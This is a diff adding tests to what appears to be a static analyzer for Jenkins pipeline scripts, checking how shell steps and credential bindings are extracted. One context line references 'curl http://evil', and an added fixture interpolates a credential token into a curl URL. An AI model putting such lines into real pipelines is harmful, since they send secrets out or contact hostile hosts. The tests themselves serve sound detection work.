@@ -116,6 +116,37 @@ def test_sh_script_named_arg_emits_shell_leaf():
     assert any("curl http://evil" in b for b in bodies), bodies
 
 
+def test_command_style_named_sh_in_assignment_keeps_owner_and_interpolation():
+    src = (
+        "node { withCredentials([string(credentialsId: 'id', variable: 'TOKEN')]) {\n"
+        "  def response = sh script: \"curl https://example.test/?key=$TOKEN\",\n"
+        "      returnStdout: true\n"
+        "} }\n"
+    )
+    shells = [leaf for leaf in _leaves(src) if leaf.value_kind == "shell"]
+    assert len(shells) == 1
+    assert shells[0].line == 2
+    assert shells[0].path == ("node", "withCredentials", "sh")
+    assert shells[0].interpolated
+
+
+def test_legacy_credential_map_preserves_class_and_password_in_same_map():
+    src = (
+        "node { withCredentials([[$class: 'UsernamePasswordMultiBinding', "
+        "credentialsId: 'id', passwordVariable: 'TOKEN'], "
+        "[$class: 'OtherBinding', credentialsId: 'other', "
+        "passwordVariable: 'OTHER']]) { sh 'echo ready' } }\n"
+    )
+    qualified = [
+        leaf for leaf in _leaves(src)
+        if "UsernamePasswordMultiBinding" in leaf.path
+    ]
+    assert {(leaf.path[-1], leaf.value) for leaf in qualified} == {
+        ("credentialsId", "id"),
+        ("passwordVariable", "TOKEN"),
+    }
+
+
 def test_sh_first_positional_string_in_parens():
     src = "node { sh('make release') }\n"
     assert _shell(src) == {"make release"}
